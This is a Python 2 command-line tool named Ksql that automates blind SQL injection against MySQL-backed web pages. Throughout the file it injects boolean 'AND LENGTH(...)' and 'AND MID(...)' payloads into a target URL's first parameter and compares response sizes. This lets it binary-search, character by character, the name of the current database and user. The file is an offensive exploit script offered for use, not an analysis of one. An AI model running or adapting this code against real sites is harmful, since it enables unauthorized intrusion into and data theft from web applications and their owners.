#!/usr/bin/env python
# -*- coding:utf-8 -*-

"""
author:		kaysen - http://www.xujiantao.com
version:	Ksql 1.0
"""

import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet
import filecmp, json, datetime, threading, sqlite3, timeit, getopt
import xml.etree.ElementTree as ET
from core import stdout
from difflib import *
from time import ctime,sleep

reload(sys)
sys.setdefaultencoding('utf8')
Timer = timeit.Timer()

def modulePath():
	try:
		_ = sys.executable if weAreFrozen() else __file__
	except NameError:
		_ = inspect.getsourcefile(modulePath)
	return os.path.dirname(os.path.realpath(_))


def htmlDecode(string):
	tmpHtmlaEncode = None
	try:
		pageInfo = chardet.detect(string)

		tmpHtmlEncode = string.decode(pageInfo['encoding'])
		
		#获取系统编码
		currentSystemEncoding = sys.getfilesystemencoding()
		
		tmpHtmlEncode = tmpHtmlEncode.encode(currentSystemEncoding)
		
	except Exception as e:
		print "错误：在处理网页编码时遇到问题：" + str(e)
		return
		
	return tmpHtmlEncode

KSQL_ROOT_PATH   = modulePath()
KSQL_XML_PATH    = os.path.join(KSQL_ROOT_PATH, 'xml')
QUERIES_XML      = os.path.join(KSQL_XML_PATH, 'queries.xml')
MAX_BLIND_COUNT  = 15
ITOA64           = '-0123456789@abcdefghijklmnopqrstuvwxyz_'
DBMS             = 'mysql' # 暂时先只支持Mysql
QueriesRoot      = ET.parse(KSQL_ROOT_PATH + '/xml/queries.xml').getroot()
QueriesDBMS      = QueriesRoot.find(DBMS)

def createBinarySql(url, type, num, midval):
	return (url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)>"%s' % (QueriesDBMS.find(type).get('query'), num, midval)), url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)<"%s' % (QueriesDBMS.find(type).get('query'), num, midval)))


sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
#sqlliteCon    = sqlite3.connect(KSQL_ROOT_PATH + '/ksql.db', check_same_thread=False)
sqlliteCursor = sqlliteCon.cursor()
sqlliteCon.execute('drop table if exists info')
sqlliteCon.commit()
sqlliteCon.execute('create table info(id integer primary key autoincrement,type varchar(10) UNIQUE,value varchar(50))')
sqlliteCon.execute('insert into info(type, value) values("--current-db", "")')
sqlliteCon.execute('insert into info(type, value) values("--current-user", "")')
sqlliteCon.commit()


def run(type, tmpUrl, num, succPageSize, frontThread):
	
	if frontThread != None: 
		frontThread.join()

	low = 0
	high = len(ITOA64) - 1

	while(low <= high):  

		now = datetime.datetime.now()

		mid = (low + high)/2  
		midval = ITOA64[mid]
		
		if type == '--current-db':
			(highSql, lowSql) = createBinarySql(tmpUrl, 'current_db', num, midval)
		elif type == '--current-user':
			(highSql, lowSql) = createBinarySql(tmpUrl, 'current_user', num, midval)
		
		stdout.printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), highSql))
		stdout.printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), lowSql))

		if len(htmlDecode(urllib.urlopen(lowSql).read())) == succPageSize:
			high = mid - 1
		elif len(htmlDecode(urllib.urlopen(highSql).read())) == succPageSize:
			low = mid + 1
		else:
			sql = 'update info set value=value||"%s" where type="%s"' % (midval, type)
			sqlliteCon.execute(sql)
			sqlliteCon.commit()
			stdout.printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
			break

def manage(type, url):
	values = url.split('?')[-1]
	host = url.split('?')[0]
	tmpUrl = ''

	'''
	暂时先只处理一个参数
	'''
	for key_value in values.split('&'):
		val = key_value.split('=')
		tmpUrl = host + '?' + val[0] + '=[[[' + val[0].upper() + ']]]'
		break

	succPageSize = len(htmlDecode(urllib.urlopen(url).read()))
	''' 猜解位数 '''
	blindCount = 0
	for num in range(1, MAX_BLIND_COUNT):

		digitUrl = ''
		if type == '--current-db':
			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(' + QueriesDBMS.find('current_db').get('query') + ')="' + str(num))
		elif type == '--current-user':
			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(' + QueriesDBMS.find('current_user').get('query') + ')="' + str(num))

		if digitUrl != '' and len(htmlDecode(urllib.urlopen(digitUrl).read())) == succPageSize:
			blindCount = num

	''' Blind SQL Injection '''
	threads = []
	for num in range(1, blindCount+1):
		if len(threads) == 0:
			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, None)))
		else:
			threads.append(threading.Thread(target=run,args=(type, tmpUrl, num, succPageSize, threads[-1])))

	for item in threads:
		item.setDaemon(True)
		item.start()
	item.join()


	cursor = sqlliteCursor.execute('select value from info where type="%s"' % type)
	checkRes = cursor.fetchone()

	if type == '--current-db':
		stdout.printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
	elif type == '--current-user':
		stdout.printDarkYellow('User: ' + checkRes[0] + "\r\n")


def Usage():
	print 'Ksql.py usage:'
	print '--current-user, Retrieve Mysql current user'
	print '--current-db, Retrieve Mysql current database'
	print '-h, --help: print help message.'
	print '-v, --version: print script version'

def Version():
	print 'Ksql v1.0'

def OutPut(args):
	print 'Hello, %s'%args

def main(argv):
	if len(argv) == 1:
		Usage()
		sys.exit(2)

	try:
		opts, args = getopt.getopt(argv[1:], 'hvu:', ['current-db', 'current-user', 'url='])
	except getopt.GetoptError, err:
		print str(err)
		Usage()
		sys.exit(2)

	cmd = []
	url = None
	for o, a in opts:
		if o in ('--current-db', '--current-user'):
			cmd.append(o)
		elif o in ('-h', '--help'):
			Usage()
			sys.exit(1)
		elif o in ('-v', '--version'):
			Version()
			sys.exit(0)
		elif o in ('-u', '--url'):
			url = a
		else:
			print 'unhandled option'
			sys.exit(3)

	if(url == '' or url == None or len(cmd)==0):
		Usage()
		sys.exit(1)

	for item in cmd:
		if item in ('--current-db', '--current-user'):
			manage(item, url)



if __name__ == '__main__':
	main(sys.argv)
	sqlliteCon.close()
	stdout.printDarkYellow('Runtime: ' + str(Timer.timeit()))
    
